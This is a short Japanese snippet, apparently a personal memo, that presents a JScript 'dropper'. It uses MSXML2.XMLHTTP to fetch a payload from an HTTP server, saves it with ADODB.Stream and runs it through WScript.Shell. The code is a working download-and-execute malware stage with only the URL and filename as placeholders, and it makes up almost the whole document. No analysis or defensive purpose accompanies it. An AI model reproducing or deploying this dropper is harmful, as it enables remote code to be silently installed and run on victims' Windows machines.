Jscriptを利用したどろっぱーには
Microsoft XML Core Servicesを利用した`MSXML2.XMLHTTP`オブジェクトを利用する。

ペイロードをHTTPサーバから持ってくるDropper
```js
var url = "URL"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("ペイロードファイル名", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("ペイロードファイル名");
```